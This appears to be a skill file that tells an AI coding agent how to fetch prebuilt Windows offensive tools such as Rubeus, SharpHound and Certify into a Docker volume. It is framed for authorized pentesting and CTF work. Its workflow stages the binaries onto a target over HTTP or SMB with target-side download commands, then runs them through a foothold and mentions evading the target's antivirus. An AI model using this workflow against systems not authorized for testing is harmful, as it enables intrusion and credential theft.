---
name: wintools
description: Fetch prebuilt Windows offensive tooling (GhostPack/Rubeus, SharpHound, Certify, Seatbelt, Inveigh, the *Potato suite, …) from the Forge registry into a shared, off-host /tools volume, for authorized pentesting and CTF. Use when you need a Windows .NET tool for a target and don't want the binary touching your host (EDR/false-positive safety). Triggers on "grab a windows tool", "download Rubeus/SharpHound/Certify/Seatbelt", "I need <SharpX> for the box", "get a forge package", "windows tooling", "prebuilt offensive .NET binary".
---

Base directory for this skill: `.claude/skills/wintools`

# wintools — prebuilt Windows tooling into a shared, off-host /tools

Pull prebuilt Windows offensive binaries (Forge / `forgenet.pages.dev`, which
builds GhostPack, SpecterOps, and the wider SharpCollection ecosystem) straight
into a **Docker named volume** so they're ready to stage onto a target — **without
the `.exe` ever landing on your host filesystem**.

## Why this exists (the safety model)

You often need `Rubeus.exe`/`SharpHound.exe`/etc. for a Windows box, but writing
offensive binaries to your host trips EDR and risks false-positive quarantine. So
`roo tools` puts them in the **`roorecon-tools` Docker volume**, which:

- **is shared** across every `roo shell` (all mount it at `/tools`),
- **persists** between shells and engagements (it's a volume, not a `--rm` FS),
- **never lands on a host path** — it lives inside the Docker VM
  (`/var/lib/docker/volumes/roorecon-tools/_data`, in the WSL2/Hyper-V VM), and the
  download + unzip happen *inside* a container, so the bytes never touch a host
  NTFS path your EDR scans.

Honest scope: this protects *your* host from *your* tooling. It is not isolation
from the target's defenses — the `.exe` you stage will still face the target's AV/
EDR (obfuscate/choose builds accordingly). And downloads egress the **public
internet, never the VPN** (Forge is a public registry, like CVE lookups).

## Commands

```bash
./roo tools list [filter]     # what Forge offers (★ marks the default build)
./roo tools builds <name>     # every build of one tool (main vs release, commits, dates)
./roo tools get <name>        # download + unpack the DEFAULT build → /tools/<name>/
./roo tools get <name> --release      # force the newest tagged release instead
./roo tools get <name> --ref <commit|version>   # pin an exact build
./roo tools installed         # what's in the volume now
./roo tools rm <name>         # remove /tools/<name> from the volume
```

`list`/`builds`/`get` don't need the VPN. Names map to upstream repos — `rubeus`,
`sharphound`, `certify`, `seatbelt`, `sharpup`, `sharpdpapi`, `inveigh`,
`sweetpotato`, `godpotato`, `whisker`, `sharpsuccessor`, `snaffler`, … — run
`roo tools list` for the live set.

## Build selection — prefer **main** over stale release tags

Many of these tools tag releases *rarely* — Rubeus and other GhostPack tools can
go a year-plus between tags while shipping new techniques on `main` — so the newest
*tagged* build is often far behind what the tool can actually do. Forge usually
carries **both** a build off the upstream release tag *and* one off the default
branch (`main`). RooRecon's default is to pull the **main/branch build**, because
that tracks current capability:

```
$ roo tools builds rubeus
  ★ [main] 74215f68ea70     commit 74215f68ea70   ← default `get` pulls this
    [rel ] 1.6.4            commit e93119a37160   ← the years-old tagged release
```

How it's detected (no guesswork): Forge labels a build by its resolved version;
with no tag it falls back to the commit hash, so **label == commit ⇒ a main
build**. `get` prefers the newest main build, falling back to the newest tagged
build only when there's no main build at all. Override when you have a reason:

- `roo tools get <name> --release` — you specifically want the pinned stable tag.
- `roo tools get <name> --ref <commit|version>` — reproduce an exact build.

So when a tool lacks a capability you expected from its current docs/`main`, check
`roo tools builds <name>` — you almost certainly want the ★ main build, which is
already the default.

## Workflow

1. **Find it.** `./roo tools list rubeus` (★ = what `get` pulls). Unsure
   which build? `./roo tools builds rubeus` shows main vs release + dates.
2. **Fetch it.** `./roo tools get rubeus` → pulls the **main** build to
   `/tools/rubeus/` (a bundle may contain several .NET-version builds; pick the one
   the target's runtime supports). Idempotent — re-`get` to refresh. Need the
   pinned release instead? `--release`; an exact commit? `--ref <commit>`.
3. **Use it from a `roo shell`.** The volume is mounted at `/tools`, so the binary
   is right there:
   ```bash
   ./roo shell ls /tools/rubeus            # (PowerShell host: prefix MSYS_NO_PATHCONV=1
   ./roo shell sh -c 'ls -la /tools'       #  is only needed from Git-Bash, see CLAUDE.md)
   ```
4. **Stage it onto the target.** The `.exe` runs on *Windows*, not in the Linux
   container — the container just **serves** it at the tunnel IP. From a `roo
   shell` (LHOST = `roo ip`):
   ```bash
   # HTTP pickup:
   ./roo shell sh -c 'cd /tools/rubeus && python3 -m http.server 8000'
   #   on target:  iwr http://<LHOST>:8000/Rubeus.exe -OutFile C:\Windows\Temp\r.exe
   # or SMB:
   ./roo shell impacket-smbserver -smb2support share /tools
   #   on target:  copy \\<LHOST>\share\rubeus\Rubeus.exe .
   ```
   Then execute on the target through your foothold (the ad skill's shells / exec
   vectors). Catch any callback in `roo shell` at the tunnel IP.

## Notes

- **Persistence is the point** — the volume survives `roo teardown` and outlives a
  single box, so your tool cache is reusable. Nuke a single tool with `roo tools
  rm <name>`, or the whole cache with `docker volume rm roorecon-tools`.
- **Trust/scope** — these are third-party prebuilt binaries; only stage them onto
  authorized targets, and prefer pinned/known builds for anything that matters.
- The **hashcat** skill (host GPU) and this skill are the two "fetch from the
  public internet" helpers; both deliberately bypass the VPN.
